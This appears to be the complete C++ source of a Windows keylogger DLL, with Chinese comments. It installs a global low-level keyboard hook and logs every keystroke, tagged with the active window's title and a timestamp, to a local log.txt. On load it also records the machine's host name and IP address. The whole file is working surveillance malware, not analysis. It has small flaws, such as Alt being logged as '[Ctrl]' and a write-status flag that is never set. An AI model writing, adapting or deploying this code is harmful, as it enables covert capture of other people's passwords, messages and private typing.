#include <windows.h>
#include <iostream>
#pragma comment(lib, "wsock32.lib")

HHOOK g_hHook = NULL;
HMODULE g_hMod = NULL;
char g_szTitle[MAX_PATH] = { 0 };


BYTE GetASCII(BYTE bVKCode)
{
	// 判定小键盘0-9数字
	if (GetKeyState(VK_NUMLOCK))
	{
		if (bVKCode == '`')
		{
			bVKCode = '0';
			return((char)bVKCode);
		}
		else if (bVKCode >= 'a' && bVKCode <= 'i')
		{
			bVKCode = bVKCode - 'a' + 0x31;
			return((char)bVKCode);
		}
	}
	// 判定大小写
	if (!GetKeyState(VK_CAPITAL) && (bVKCode >= 0x41 && bVKCode <= 0x5A))
	{
		bVKCode |= 0x20;
	}

	return((char)bVKCode);
}

BOOL SaveContent(const char* pcszContent)
{

	size_t nLen = 0;
	HANDLE hFile = INVALID_HANDLE_VALUE;
	char szBuf[MAX_PATH] = { 0 };
	DWORD dwWritten = 0;
	BOOL fOk = FALSE;
	BOOL fTime = FALSE;

	if (NULL == pcszContent)
	{
		return(FALSE);
	}
	GetCurrentDirectoryA(MAX_PATH, szBuf);
	strcat_s(szBuf, MAX_PATH, "\\log.txt");
	nLen = strlen(pcszContent);
	// 尝试打开文件
	hFile = CreateFileA(szBuf,
		GENERIC_READ | GENERIC_WRITE,
		FILE_SHARE_READ,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		NULL
	);
	if (INVALID_HANDLE_VALUE == hFile)
	{
		// 无法打开尝试创建
		hFile = CreateFileA(szBuf,
			GENERIC_READ | GENERIC_WRITE,
			FILE_SHARE_READ,
			NULL,
			CREATE_ALWAYS,
			FILE_ATTRIBUTE_NORMAL,
			NULL
		);
		if (INVALID_HANDLE_VALUE == hFile)
		{
			return(FALSE);
		}
	}
	SetFilePointer(hFile, 0, NULL, FILE_END);
	fOk = WriteFile(hFile, pcszContent, nLen, &dwWritten, NULL);
	if (!fOk || nLen > dwWritten || !fTime)
	{
		CloseHandle(hFile);
		hFile = NULL;
		return(FALSE);
	}
	CloseHandle(hFile);
	hFile = NULL;

	return(TRUE);
}

//获取本机IP
void getIP()
{
	char* IP = new char[16];			//本机IP
	char* HOSTNAME = new char[256];		//本机主机名
	struct hostent* ph = 0;
	WSADATA w;
	WSAStartup(0x0101, &w);
	gethostname(HOSTNAME, 256);//获取本机名到buff 
	ph = gethostbyname(HOSTNAME);
	IP = inet_ntoa(*((struct in_addr*)ph->h_addr_list[0]));//本机IP
	WSACleanup();

	char content[100] = { 0 };
	sprintf_s(content, "HOST:%s IP:%s", HOSTNAME, IP);
	SaveContent(content);
}


BOOL GetPrefix(char* pszBuf, size_t nSize)
{
	HWND hWndForeground = NULL;
	char szCurWindowTitle[MAX_PATH] = { 0 };


	if (NULL == pszBuf)
	{
		return(FALSE);
	}
	RtlZeroMemory(pszBuf, nSize);

	hWndForeground = GetForegroundWindow();
	if (hWndForeground == NULL)
	{
		hWndForeground = GetDesktopWindow();
	}
	GetWindowTextA(hWndForeground, szCurWindowTitle, MAX_PATH);

	// 如果变了窗口
	if (_stricmp(szCurWindowTitle, g_szTitle))
	{
		RtlZeroMemory(g_szTitle, MAX_PATH);
		strcpy_s(g_szTitle, MAX_PATH, szCurWindowTitle);
		strcpy_s(pszBuf, nSize, "[");
		strcat_s(pszBuf, nSize, g_szTitle);
		strcat_s(pszBuf, nSize, "]:\r\n\r\n");

		return(TRUE);
	}
	return(FALSE);
}

LRESULT CALLBACK LowLevelKeyboardProc(
	_In_ int    nCode,
	_In_ WPARAM wParam,
	_In_ LPARAM lParam
)
{
	KBDLLHOOKSTRUCT stKbdHook = *(PKBDLLHOOKSTRUCT)lParam;
	DWORD dwVkCode = stKbdHook.vkCode;
	char szBuf[16] = { 0 };
	char szPrefix[MAX_PATH] = { 0 };

	if (nCode == HC_ACTION)
	{
		if (WM_KEYDOWN == wParam || WM_SYSKEYDOWN == wParam)
		{

			RtlZeroMemory(szBuf, 16);
			// 包含了[(0-9)(a-z)(A-Z)]
			if (dwVkCode >= 0x30 && dwVkCode <= 0x5A ||
				(dwVkCode >= 0x60 && dwVkCode <= 0x69) ||
				(dwVkCode >= 'a' && dwVkCode <= 'i') || dwVkCode == '`')
			{
				// 获取对应的ASCII
				szBuf[0] = GetASCII(dwVkCode);
			}
			// 包含F1-F24
			else if (dwVkCode >= 0x70 && dwVkCode <= 0x84)
			{
				int F_number = dwVkCode - 0x70 + 1;
				szBuf[0] = 'F';
				szBuf[1] = F_number;
				_itoa_s(F_number, &szBuf[1], 4, 10);
			}
			else
			{
				switch (dwVkCode)
				{
				case VK_LSHIFT: // shift键
				case VK_RSHIFT:
					strcpy_s(szBuf, sizeof(szBuf), "[Shift]");
					break;
				case VK_LCONTROL: // ctrl键
				case VK_RCONTROL:
					strcpy_s(szBuf, sizeof(szBuf), "[Ctrl]");
					break;
				case VK_MENU: // Alt键
					strcpy_s(szBuf, sizeof(szBuf), "[Ctrl]");
					break;
				case VK_ESCAPE: // ESC键
					strcpy_s(szBuf, sizeof(szBuf), "[Esc]");
					break;
				case VK_SPACE: // 空格键
					strcpy_s(szBuf, sizeof(szBuf), " ");
					break;
				case VK_DELETE: // delete键
					strcpy_s(szBuf, sizeof(szBuf), "[Delete]");
					break;
				case VK_RETURN: // 回车键
					strcpy_s(szBuf, sizeof(szBuf), "\n");
					break;
				case VK_TAB: // tab键
					strcpy_s(szBuf, sizeof(szBuf), "\t");
					break;
				case VK_LWIN: // Win键
				case VK_RWIN: 
					strcpy_s(szBuf, sizeof(szBuf), "[Win]");
					break;
				case VK_BACK: // 退格键
					strcpy_s(szBuf, sizeof(szBuf), "[<--]");
					break;
				case VK_MULTIPLY: // 乘法
					strcpy_s(szBuf, sizeof(szBuf), "*");
					break;
				case VK_DIVIDE: // 除法
					strcpy_s(szBuf, sizeof(szBuf), "/");
					break;
				case VK_ADD: // 加法
					strcpy_s(szBuf, sizeof(szBuf), "+");
					break;
				case VK_SUBTRACT: // 减法
					strcpy_s(szBuf, sizeof(szBuf), "-");
					break;

				default:
					break;
				}
			}
			// 如果活动窗口发生了变换则添加新的当前窗口标题提示
			if (GetPrefix(szPrefix, MAX_PATH))
			{
				//获取时间戳
				time_t curtime = time(NULL);
				tm* ctm = new tm();
				localtime_s(ctm, &curtime);
				char currentTime[64];
				sprintf_s(currentTime, "\r\n\r\n[%d/%02d/%02d %02d:%02d:%02d]  ", ctm->tm_year + 1900, ctm->tm_mon + 1,
					ctm->tm_mday, ctm->tm_hour, ctm->tm_min, ctm->tm_sec);
				SaveContent(currentTime);
				SaveContent(szPrefix);
			}
			// 将捕获的内容写入要保存的文件中
			SaveContent(szBuf);
		}
	}
	return(CallNextHookEx(g_hHook, nCode, wParam, lParam));
}

extern "C" __declspec(dllexport) BOOL SetKbdHook()
{
	BOOL fOk = FALSE;
	LRESULT lResult = 0;

	g_hHook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, g_hMod, 0);
	if (NULL == g_hHook)
	{
		return(FALSE);
	}

	return(TRUE);
}

extern "C" __declspec(dllexport) VOID UnhookKbdHook()
{
	if (NULL != g_hHook)
	{
		UnhookWindowsHookEx(g_hHook);
		g_hHook = NULL;
	}
}

BOOL APIENTRY DllMain(HMODULE hModule,
	DWORD  ul_reason_for_call,
	LPVOID lpReserved
)
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
	{
		g_hMod = hModule;
		getIP();
		break;
	}
	case DLL_PROCESS_DETACH:
	{
		break;
	}
	default:
	{
		break;
	}
	}
	return(TRUE);
}